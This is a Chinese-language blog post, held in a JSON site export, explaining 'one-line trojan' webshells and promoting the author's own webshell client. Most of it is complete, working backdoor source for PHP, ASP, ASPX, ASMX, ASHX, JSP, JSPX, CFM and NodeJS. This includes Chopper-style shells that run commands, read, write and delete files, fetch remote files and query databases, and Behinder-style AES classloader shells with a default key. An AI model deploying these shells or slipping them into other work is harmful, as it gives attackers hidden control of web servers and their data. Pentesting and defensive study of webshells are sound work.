https://github.com/malbuffer4pt/Alien","categories":[{"name":"Tools","slug":"Tools","permalink":"https://iss4cf0ng.github.io/categories/Tools/"}],"tags":[{"name":"pentest","slug":"pentest","permalink":"https://iss4cf0ng.github.io/tags/pentest/"},{"name":"webshell","slug":"webshell","permalink":"https://iss4cf0ng.github.io/tags/webshell/"},{"name":"backdoor","slug":"backdoor","permalink":"https://iss4cf0ng.github.io/tags/backdoor/"},{"name":"工具","slug":"工具","permalink":"https://iss4cf0ng.github.io/tags/%E5%B7%A5%E5%85%B7/"},{"name":"Alien","slug":"Alien","permalink":"https://iss4cf0ng.github.io/tags/Alien/"}],"keywords":[{"name":"Tools","slug":"Tools","permalink":"https://iss4cf0ng.github.io/categories/Tools/"}]},{"title":"【Tech】一句話木馬","slug":"【Tech】一句話木馬","date":"2023-06-05T17:04:54.000Z","updated":"2026-02-23T08:43:48.240Z","comments":true,"path":"2023/06/06/【Tech】一句話木馬/","link":"","permalink":"https://iss4cf0ng.github.io/2023/06/06/%E3%80%90Tech%E3%80%91%E4%B8%80%E5%8F%A5%E8%A9%B1%E6%9C%A8%E9%A6%AC/","excerpt":"","text":"甚麼是WebShellWebShell是在滲透測試和入侵時都會用到的工具，是一種後門，需要注意的時WebShell和網頁木馬不一樣，網頁木馬是掛在正常網頁上的木馬程式，當使用者瀏覽網頁時就會下載或執行木馬。WebShell是用來控制一整個網頁伺服器的工具。WebShell有以下三種 : 大馬 : 檔案大，30~70KB以上，加密後會超過100KB。 小馬 : 檔案小，一般在10KB以下 指令執行木馬 : 只能簡單地執行的Shell Command. 一句話木馬 : 功能可超越大馬，容易隱藏和改造。 一句話木馬在現今的入侵和滲透用的webshell基本上用的都是一句話木馬，大馬的好處是所有執行的Payload都是在localhost上進行，不使用HTTP POST，可以不考慮WAF，但因為檔案太大很容易會被發現，而且不容易寫變種。一句話木馬雖然會因為使用HTTP POST會被WAF檢查，但是很容易寫變種和隱藏，還可以直接寫在正常的檔案內。 一句話木馬客戶端指的是先把對應語言的Payload寫好，再用客戶端發起 POST Request，這樣就會非常方便在大陸以前比較有名的工具叫 中國菜刀，大陸現在比較常用的工具有三個 : 蟻劍 Godzilla 冰蝎 這邊推一下我自己寫的Alienhttps://malbuffer4pt.github.io/Alien 一句話木馬的程式在伺服器沒有裝WAF，Anti-Virus時，只需要用這不到 1KB的程式就可以控制一整台伺服器如下圖 (工具: Alien) 以php為例，PHP一句話木馬為1&lt;?php @eval($_POST[&#x27;pass&#x27;]); ?&gt;$_POST[‘pass’] : 取得HTTP POST參數為pass的Data@eval($str); : 把 $str 以PHP Code執行 , @ 代表如果 $str == null時就不顯示結果(這樣就增加了隱密性。)所以 @eval($_POST[‘pass’]); 就可以把HTTP POST的內容執行, 如 :1pass=phpinfo();就可執行phphinfo(); ASP :1&lt;% execute(request(&quot;pass&quot;)) %&gt; ASPX :12&lt;%@ Page Language=&quot;Jscript&quot;%&gt;&lt;%eval(Request.Item[&quot;pass&quot;])%&gt; 關於ASMX, ASHX, CFM, JSP, JSPX和NodeJS木馬它們的特點都是沒有「好用」(對攻撃者而言)的eval()函數，或者使用上會比較麻煩…ASMX和ASHX是我在Freebuf上找到的，作者是Ivan，這也有寫進Alien內。而CFM是一個很老的東西了… ASMX123456789101112131415161718&lt;%@ WebService Language=&quot;JScript&quot; class=&quot;ScriptMethodSpy&quot;%&gt;import System;import System.Web;import System.IO;import System.Web.Servicesimport System.Web.Script.Servicespublic class ScriptMethodSpy extends WebService&#123; WebMethodAttribute ScriptMethodAttribute function Invoke(Ivan : String) : Void &#123; var I = HttpContext.Current; var Request = I.Request; var Response = I.Response; var Server = I.Server; Response.Write(&quot;&lt;H1&gt;Just for Research Learning, Do Not Abuse It! Written By &lt;a href=&#x27;https://github.com/Ivan1ee&#x27;&gt;Ivan1ee&lt;/a&gt;&lt;/H1&gt;&quot;); eval(Ivan); &#125;&#125; ASHX12345678910111213&lt;%@ WebHandler Language=&quot;JScript&quot;class=&quot; HandlerSpy &quot;%&gt;import System;import System.Web;import System.IO;public class HandlerSpy implements IHttpHandler&#123; function IHttpHandler.ProcessRequest(context : HttpContext)&#123; context.Response.Write(&quot;&lt;H1&gt;Just for fun, Do not abuse it!Written by &lt;ahref=&#x27;https://github.com/Ivan1ee&#x27;&gt;Ivan1ee&lt;/a&gt;&lt;/H1&gt; &quot;); eval(context.Request[&quot;Ivan&quot;]); &#125; function get IHttpHandler.IsReusable() : Boolean&#123; return false; &#125;&#125; JSPJSP目前主要有兩種，菜刀形和冰蝎形菜刀形 :1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859&lt;%@page import=&quot;java.io.*,java.util.*,java.net.*,java.sql.*,java.text.*&quot;%&gt;&lt;%!String Pwd=&quot;sky&quot;;String EC(String s,String c)throws Exception&#123;return s;&#125;//new String(s.getBytes(&quot;ISO-8859-1&quot;),c);&#125;Connection GC(String s)throws Exception&#123;String[] x=s.trim().split(&quot;\\r\\n&quot;);Class.forName(x[0].trim()).newInstance();Connection c=DriverManager.getConnection(x[1].trim());if(x.length&gt;2)&#123;c.setCatalog(x[2].trim());&#125;return c;&#125;void AA(StringBuffer sb)throws Exception&#123;File r[]=File.listRoots();for(int i=0;i&lt;r.length;i++)&#123;sb.append(r[i].toString().substring(0,2));&#125;&#125;void BB(String s,StringBuffer sb)throws Exception&#123;File oF=new File(s),l[]=oF.listFiles();String sT, sQ,sF=&quot;&quot;;java.util.Date dt;SimpleDateFormat fm=new SimpleDateFormat(&quot;yyyy-MM-dd HH:mm:ss&quot;);for(int i=0;i&lt;l.length;i++)&#123;dt=new java.util.Date(l[i].lastModified());sT=fm.format(dt);sQ=l[i].canRead()?&quot;R&quot;:&quot;&quot;;sQ+=l[i].canWrite()?&quot; W&quot;:&quot;&quot;;if(l[i].isDirectory())&#123;sb.append(l[i].getName()+&quot;/\\t&quot;+sT+&quot;\\t&quot;+l[i].length()+&quot;\\t&quot;+sQ+&quot;\\n&quot;);&#125;else&#123;sF+=l[i].getName()+&quot;\\t&quot;+sT+&quot;\\t&quot;+l[i].length()+&quot;\\t&quot;+sQ+&quot;\\n&quot;;&#125;&#125;sb.append(sF);&#125;void EE(String s)throws Exception&#123;File f=new File(s);if(f.isDirectory())&#123;File x[]=f.listFiles();for(int k=0;k&lt;x.length;k++)&#123;if(!x[k].delete())&#123;EE(x[k].getPath());&#125;&#125;&#125;f.delete();&#125;void FF(String s,HttpServletResponse r)throws Exception&#123;int n;byte[] b=new byte[512];r.reset();ServletOutputStream os=r.getOutputStream();BufferedInputStream is=new BufferedInputStream(new FileInputStream(s));os.write((&quot;-&gt;&quot;+&quot;|&quot;).getBytes(),0,3);while((n=is.read(b,0,512))!=-1)&#123;os.write(b,0,n);&#125;os.write((&quot;|&quot;+&quot;&lt;-&quot;).getBytes(),0,3);os.close();is.close();&#125;void GG(String s, String d)throws Exception&#123;String h=&quot;0123456789ABCDEF&quot;;int n;File f=new File(s);f.createNewFile();FileOutputStream os=new FileOutputStream(f);for(int i=0;i&lt;d.length();i+=2)&#123;os.write((h.indexOf(d.charAt(i))&lt;&lt;4|h.indexOf(d.charAt(i+1))));&#125;os.close();&#125;void HH(String s,String d)throws Exception&#123;File sf=new File(s),df=new File(d);if(sf.isDirectory())&#123;if(!df.exists())&#123;df.mkdir();&#125;File z[]=sf.listFiles();for(int j=0;j&lt;z.length;j++)&#123;HH(s+&quot;/&quot;+z[j].getName(),d+&quot;/&quot;+z[j].getName());&#125;&#125;else&#123;FileInputStream is=new FileInputStream(sf);FileOutputStream os=new FileOutputStream(df);int n;byte[] b=new byte[512];while((n=is.read(b,0,512))!=-1)&#123;os.write(b,0,n);&#125;is.close();os.close();&#125;&#125;void II(String s,String d)throws Exception&#123;File sf=new File(s),df=new File(d);sf.renameTo(df);&#125;void JJ(String s)throws Exception&#123;File f=new File(s);f.mkdir();&#125;void KK(String s,String t)throws Exception&#123;File f=new File(s);SimpleDateFormat fm=new SimpleDateFormat(&quot;yyyy-MM-dd HH:mm:ss&quot;);java.util.Date dt=fm.parse(t);f.setLastModified(dt.getTime());&#125;void LL(String s, String d)throws Exception&#123;URL u=new URL(s);int n;FileOutputStream os=new FileOutputStream(d);HttpURLConnection h=(HttpURLConnection)u.openConnection();InputStream is=h.getInputStream();byte[] b=new byte[512];while((n=is.read(b,0,512))!=-1)&#123;os.write(b,0,n);&#125;os.close();is.close();h.disconnect();&#125;void MM(InputStream is, StringBuffer sb)throws Exception&#123;String l;BufferedReader br=new BufferedReader(new InputStreamReader(is));while((l=br.readLine())!=null)&#123;sb.append(l+&quot;\\r\\n&quot;);&#125;&#125;void NN(String s,StringBuffer sb)throws Exception&#123;Connection c=GC(s);ResultSet r=c.getMetaData().getCatalogs();while(r.next())&#123;sb.append(r.getString(1)+&quot;\\t&quot;);&#125;r.close();c.close();&#125;void OO(String s,StringBuffer sb)throws Exception&#123;Connection c=GC(s);String[] t=&#123;&quot;TABLE&quot;&#125;;ResultSet r=c.getMetaData().getTables (null,null,&quot;%&quot;,t);while(r.next())&#123;sb.append(r.getString(&quot;TABLE_NAME&quot;)+&quot;\\t&quot;);&#125;r.close();c.close();&#125;void PP(String s,StringBuffer sb)throws Exception&#123;String[] x=s.trim().split(&quot;\\r\\n&quot;);Connection c=GC(s);Statement m=c.createStatement(1005,1007);ResultSet r=m.executeQuery(&quot;select * from &quot;+x[3]);ResultSetMetaData d=r.getMetaData();for(int i=1;i&lt;=d.getColumnCount();i++)&#123;sb.append(d.getColumnName(i)+&quot; (&quot;+d.getColumnTypeName(i)+&quot;)\\t&quot;);&#125;r.close();m.close();c.close();&#125;void QQ(String cs,String s,String q,StringBuffer sb)throws Exception&#123;int i;Connection c=GC(s);Statement m=c.createStatement(1005,1008);try&#123;ResultSet r=m.executeQuery(q);ResultSetMetaData d=r.getMetaData();int n=d.getColumnCount();for(i=1;i&lt;=n;i++)&#123;sb.append(d.getColumnName(i)+&quot;\\t|\\t&quot;);&#125;sb.append(&quot;\\r\\n&quot;);while(r.next())&#123;for(i=1;i&lt;=n;i++)&#123;sb.append(EC(r.getString(i),cs)+&quot;\\t|\\t&quot;);&#125;sb.append(&quot;\\r\\n&quot;);&#125;r.close();&#125;catch(Exception e)&#123;sb.append(&quot;Result\\t|\\t\\r\\n&quot;);try&#123;m.executeUpdate(q);sb.append(&quot;Execute Successfully!\\t|\\t\\r\\n&quot;);&#125;catch(Exception ee)&#123;sb.append(ee.toString()+&quot;\\t|\\t\\r\\n&quot;);&#125;&#125;m.close();c.close();&#125;%&gt;&lt;%String cs=request.getParameter(&quot;z0&quot;)+&quot;&quot;;request.setCharacterEncoding(cs);response.setContentType(&quot;text/html;charset=&quot;+cs);String Z=EC(request.getParameter(Pwd)+&quot;&quot;,cs);String z1=EC(request.getParameter(&quot;z1&quot;)+&quot;&quot;,cs);String z2=EC(request.getParameter(&quot;z2&quot;)+&quot;&quot;,cs);StringBuffer sb=new StringBuffer(&quot;&quot;);try&#123;sb.append(&quot;-&gt;&quot;+&quot;|&quot;);if(Z.equals(&quot;A&quot;))&#123;String s=new File(application.getRealPath(request.getRequestURI())).getParent();sb.append(s+&quot;\\t&quot;);if(!s.substring(0,1).equals(&quot;/&quot;))&#123;AA(sb);&#125;&#125;else if(Z.equals(&quot;B&quot;))&#123;BB(z1,sb);&#125;else if(Z.equals(&quot;C&quot;))&#123;String l=&quot;&quot;;BufferedReader br=new BufferedReader(new InputStreamReader(new FileInputStream(new File(z1))));while((l=br.readLine())!=null)&#123;sb.append(l+&quot;\\r\\n&quot;);&#125;br.close();&#125;else if(Z.equals(&quot;D&quot;))&#123;BufferedWriter bw=new BufferedWriter(new OutputStreamWriter(new FileOutputStream(new File(z1))));bw.write(z2);bw.close();sb.append(&quot;1&quot;);&#125;else if(Z.equals(&quot;E&quot;))&#123;EE(z1);sb.append(&quot;1&quot;);&#125;else if(Z.equals(&quot;F&quot;))&#123;FF(z1,response);&#125;else if(Z.equals(&quot;G&quot;))&#123;GG(z1,z2);sb.append(&quot;1&quot;);&#125;else if(Z.equals(&quot;H&quot;))&#123;HH(z1,z2);sb.append(&quot;1&quot;);&#125;else if(Z.equals(&quot;I&quot;))&#123;II(z1,z2);sb.append(&quot;1&quot;);&#125;else if(Z.equals(&quot;J&quot;))&#123;JJ(z1);sb.append(&quot;1&quot;);&#125;else if(Z.equals(&quot;K&quot;))&#123;KK(z1,z2);sb.append(&quot;1&quot;);&#125;else if(Z.equals(&quot;L&quot;))&#123;LL(z1,z2);sb.append(&quot;1&quot;);&#125;else if(Z.equals(&quot;M&quot;))&#123;String[] c=&#123;z1.substring(2),z1.substring(0,2),z2&#125;;Process p=Runtime.getRuntime().exec(c);MM(p.getInputStream(),sb);MM(p.getErrorStream(),sb);&#125;else if(Z.equals(&quot;N&quot;))&#123;NN(z1,sb);&#125;else if(Z.equals(&quot;O&quot;))&#123;OO(z1,sb);&#125;else if(Z.equals(&quot;P&quot;))&#123;PP(z1,sb);&#125;else if(Z.equals(&quot;Q&quot;))&#123;QQ(cs,z1,z2,sb);&#125;&#125;catch(Exception e)&#123;sb.append(&quot;ERROR&quot;+&quot;:// &quot;+e.toString());&#125;sb.append(&quot;|&quot;+&quot;&lt;-&quot;);out.print(sb.toString());%&gt;菜刀形就是把所有功能全部寫進一個JSP檔，然後在HTTP POST的時候就會以A, B, C, …, M 執行不同Payload，然面再接上一些參數。 下面是冰蝎 :12345678910&lt;%@page import=&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot;%&gt;&lt;%!class U extends ClassLoader&#123;U(ClassLoader c)&#123;super(c);&#125;public Class g(byte []b)&#123;return super.defineClass(b,0,b.length);&#125;&#125;%&gt;&lt;%if (request.getMethod().equals(&quot;POST&quot;)) &#123; String k=&quot;e45e329feb5d925b&quot;;/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/ session.putValue(&quot;u&quot;,k); Cipher c=Cipher.getInstance(&quot;AES&quot;); c.init(2,new SecretKeySpec(k.getBytes(),&quot;AES&quot;)); new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);&#125; %&gt;冰蝎使用的是ClassLoader()，這樣就相當於是一個Eval函數了。 JSPX1&lt;jsp:root xmlns:jsp=&quot;http://java.sun.com/JSP/Page&quot; version=&quot;1.2&quot;&gt;&lt;jsp:directive.page import=&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot;/&gt;&lt;jsp:declaration&gt; class U extends ClassLoader&#123;U(ClassLoader c)&#123;super(c);&#125;public Class g(byte []b)&#123;return super.defineClass(b,0,b.length);&#125;&#125;&lt;/jsp:declaration&gt;&lt;jsp:scriptlet&gt;String k=&quot;e45e329feb5d925b&quot;;session.putValue(&quot;u&quot;,k);Cipher c=Cipher.getInstance(&quot;AES&quot;);c.init(2,new SecretKeySpec((session.getValue(&quot;u&quot;)+&quot;&quot;).getBytes(),&quot;AES&quot;));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);&lt;/jsp:scriptlet&gt;&lt;/jsp:root&gt; CFM123456789101112131415161718192021222324252627&lt;CFSET O=&quot;&quot; /&gt;&lt;CFTRY&gt;&lt;CFSWITCH EXPRESSION=#Form.chopper#&gt;&lt;CFCASE VALUE=&quot;A&quot;&gt;&lt;CFSCRIPT&gt;O=O&amp;Expandpath(&quot;./&quot;)&amp;Chr(9);for(c=65;c lt 91;c=c+1)&#123;if(DirectoryExists(Chr(c)&amp;&quot;:\\&quot;))O=O&amp;Chr(c)&amp;&quot;:&quot;;&#125;&lt;/CFSCRIPT&gt;&lt;/CFCASE&gt;&lt;CFCASE VALUE=&quot;B&quot;&gt;&lt;CFDIRECTORY DIRECTORY=&quot;#Form.z1#&quot; NAME=&quot;D&quot; SORT=&quot;Type&quot;&gt;&lt;CFLOOP Query=&quot;D&quot;&gt;&lt;CFSCRIPT&gt;O=O&amp;D.Name;If(D.Type eq &quot;Dir&quot;)O=O&amp;&quot;/&quot;;O=O&amp;Chr(9)&amp;DateFormat(D.DateLastModified,&quot;yyyy-mm-dd&quot;)&amp;TimeFormat(D.DateLastModified,&quot; HH:MM:ss&quot;)&amp;Chr(9)&amp;D.Size&amp;Chr(9);If(Left(Form.z1,1) eq &quot;/&quot;)&#123;O=O&amp;D.Mode;&#125;else&#123;O=O&amp;D.Attributes;&#125;O=O&amp;Chr(10);&lt;/CFSCRIPT&gt;&lt;/CFLOOP&gt;&lt;/CFCASE&gt;&lt;CFCASE VALUE=&quot;C&quot;&gt;&lt;CFFILE ACTION=&quot;Read&quot; FILE=&quot;#Form.z1#&quot; VARIABLE=&quot;O&quot;&gt;&lt;/CFCASE&gt;&lt;CFCASE VALUE=&quot;D&quot;&gt;&lt;CFFILE ACTION=&quot;Write&quot; FILE=&quot;#Form.z1#&quot; OUTPUT=&quot;#Form.z2#&quot;&gt;&lt;CFSET O=&quot;1&quot; /&gt;&lt;/CFCASE&gt;&lt;CFCASE VALUE=&quot;E&quot;&gt;&lt;CFSCRIPT&gt;Function DF(P)&#123;F=CreateObject(&quot;java&quot;,&quot;java.io.File&quot;).init(P);L=0;i=0;if(F.isDirectory())&#123;L=F.listFiles();for(i=1;i lte ArrayLen(L);i=i+1)&#123;if(not L[i].delete())&#123;DF(L[i].getPath());&#125;&#125;&#125;F.delete();&#125;DF(Form.z1);O=&quot;1&quot;;&lt;/CFSCRIPT&gt;&lt;/CFCASE&gt;&lt;CFCASE VALUE=&quot;F&quot;&gt;&lt;cffile action=&quot;readbinary&quot; file=&quot;#Form.z1#&quot; variable=&quot;B&quot; /&gt;&lt;cfset J=CreateObject(&quot;java&quot;,&quot;java.nio.ByteBuffer&quot;) /&gt;&lt;cfset X=J.Allocate(JavaCast( &quot;int&quot;, ArrayLen(B)+6)) /&gt;&lt;cfset X.Put(ToBinary(ToBase64(&quot;-&gt;&quot;&amp;&quot;|&quot;)), JavaCast(&quot;int&quot;,0), 3 ) /&gt;&lt;cfset X.Put(B, JavaCast(&quot;int&quot;,0), JavaCast(&quot;int&quot;,ArrayLen(B)) ) /&gt;&lt;cfset X.Put(ToBinary(ToBase64(&quot;|&quot;&amp;&quot;&lt;-&quot;)), JavaCast(&quot;int&quot;,0), 3 ) /&gt;&lt;CFCONTENT Type=&quot;application/octet-stream&quot; Variable=&quot;#X.Array()#&quot;&gt;&lt;CFABORT&gt;&lt;/CFCASE&gt;&lt;CFCASE VALUE=&quot;G&quot;&gt;&lt;CFSCRIPT&gt;F=CreateObject(&quot;java&quot;,&quot;java.io.FileOutputStream&quot;);F.init(Form.z1);h=&quot;0123456789ABCDEF&quot;;C=Form.z2;for(i=0;i lt Len(C);i=i+2)&#123;F.write(BitOr(BitSHLN(h.indexOf(C.charAt(i)),4),h.indexOf(C.charAt(i+1))));&#125;F.close();O=&quot;1&quot;;&lt;/CFSCRIPT&gt;&lt;/CFCASE&gt;&lt;CFCASE VALUE=&quot;H&quot;&gt;&lt;CFFUNCTION Name=&quot;cpf&quot;&gt;&lt;CFARGUMENT Name=&quot;S&quot;&gt;&lt;CFARGUMENT Name=&quot;D&quot;&gt;&lt;CFFILE ACTION=&quot;Copy&quot; SOURCE=&quot;#S#&quot; DESTINATION=&quot;#D#&quot;&gt;&lt;/CFFUNCTION&gt;&lt;CFSCRIPT&gt;Function CP(S,D)&#123;sf=CreateObject(&quot;java&quot;,&quot;java.io.File&quot;).init(S);df=CreateObject(&quot;java&quot;,&quot;java.io.File&quot;).init(D);L=0;i=0;if(sf.isDirectory())&#123;if(not df.exists())&#123;df.mkdir();&#125;L=sf.listFiles();for(i=1;i lte ArrayLen(L);i=i+1)&#123;if(L[i].isDirectory())&#123;CP(L[i].getPath(),df.getPath()&amp;&quot;/&quot;&amp;L[i].getName());&#125;else&#123;cpf(L[i].getPath(),df.getPath()&amp;&quot;/&quot;&amp;L[i].getName());&#125;&#125;&#125;else&#123;cpf(S,D);&#125;&#125;CP(Form.z1,Form.z2);O=&quot;1&quot;;&lt;/CFSCRIPT&gt;&lt;/CFCASE&gt;&lt;CFCASE VALUE=&quot;I&quot;&gt;&lt;CFFILE ACTION=&quot;MOVE&quot; SOURCE=&quot;#Form.z1#&quot; DESTINATION=&quot;#Form.z2#&quot;&gt;&lt;CFSET O=&quot;1&quot; /&gt;&lt;/CFCASE&gt;&lt;CFCASE VALUE=&quot;J&quot;&gt;&lt;CFDIRECTORY Directory=&quot;#Form.z1#&quot; Action=&quot;Create&quot;&gt;&lt;CFSET O=&quot;1&quot; /&gt;&lt;/CFCASE&gt;&lt;CFCASE VALUE=&quot;K&quot;&gt;&lt;CFSCRIPT&gt;FileSetLastModified(Form.z1,ParseDateTime(Form.z2));O=&quot;1&quot;;&lt;/CFSCRIPT&gt;&lt;/CFCASE&gt;&lt;CFCASE VALUE=&quot;L&quot;&gt;&lt;CFSCRIPT&gt;Z=Form.z2;For(i=Len(Z);i gt 0;i=i-1)&#123;if(Mid(Z,i,1) eq &quot;/&quot; Or Mid(Z,i,1) eq &quot;\\&quot;)&#123;Break;&#125;&#125;P=Left(Z,i);F=Mid(Z,i+1,256);&lt;/CFSCRIPT&gt;&lt;CFHTTP METHOD=&quot;Get&quot; URL=&quot;#Form.z1#&quot; PATH=&quot;#P#&quot; FILE=&quot;#F#&quot;&gt;&lt;CFSET O=&quot;1&quot; /&gt;&lt;/CFCASE&gt;&lt;CFCASE VALUE=&quot;M&quot;&gt;&lt;CFEXECUTE Name=&quot;#Mid(Form.z1,3,Len(Form.z1)-2)#&quot; Arguments=&quot;#Mid(Form.z1,1,2)# #Form.z2#&quot; Variable=&quot;O&quot; TimeOut=&quot;60&quot; /&gt;&lt;/CFCASE&gt;&lt;/CFSWITCH&gt;&lt;CFCATCH Type=&quot;Any&quot;&gt;&lt;CFSET O=&quot;ERROR:// &quot;&amp;CFCatch.Message /&gt;&lt;/CFCATCH&gt;&lt;/CFTRY&gt;&lt;CFOUTPUT&gt;-&gt;#Chr(124)&amp;O&amp;Chr(124)#&lt;-&lt;/CFOUTPUT&gt; 菜刀形，跟上面的JSP一樣。 NodeJS1234567891011121314151617181920212223242526272829303132var http = require(&#x27;http&#x27;), url = require(&#x27;url&#x27;), exec = require(&#x27;child_process&#x27;).exec;var querystring = require(&#x27;querystring&#x27;);var host = &quot;127.0.0.1&quot;, port = &quot;5555&quot;, thisServerUrl = &quot;http://&quot; + host + &quot;:&quot; + port;http.createServer(function (req, res) &#123; req.addListener(&#x27;end&#x27;, function () &#123; &#125;); //var parsedUrl = url.parse(req.url, true); //var cmd = parsedUrl.query[&#x27;cmd&#x27;]; var string = &#x27;&#x27;; req.addListener(&#x27;data&#x27;, function(chunk)&#123; string += chunk; &#125;); var cmd; req.addListener(&#x27;end&#x27;, function()&#123; var strObj = querystring.parse(string); cmd = strObj.pass; res.writeHead(200, &#123;&#x27;Content-Type&#x27;: &#x27;text/plain&#x27;&#125;); if (cmd) &#123; try &#123;eval(cmd);&#125; catch(e) &#123;console.log(&quot;ERROR://&quot; + e);res.end(&quot;ERROR://&quot;);&#125; &#125; else &#123; res.end(); &#125; &#125;);&#125;).listen(port, host);console.log(&#x27;Server running at &#x27; + thisServerUrl ); NodeJS的木馬在滲透測試中不見得能用上，因為使用條件跟php, asp, aspx這些比較過於苛刻。","categories":[{"name":"Code","slug":"Code","permalink":"https://iss4cf0ng.github.io/categories/Code/"}],"tags":[{"name":"Code","slug":"Code","permalink":"https://iss4cf0ng.github.io/tags/Code/"},{"name":"pentest","slug":"pentest","permalink":"https://iss4cf0ng.github.io/tags/pentest/"},{"name":"webshell","slug":"webshell","permalink":"https://iss4cf0ng.github.io/tags/webshell/"},{"name":"trojan","slug":"trojan","permalink":"https://iss4cf0ng.github.io/tags/trojan/"},{"name":"backdoor","slug":"backdoor","permalink":"https://iss4cf0ng.github.io/tags/backdoor/"}],"keywords":[{"name":"Code","slug":"Code","permalink":"https://iss4cf0ng.github.io/categories/Code/"}]}]}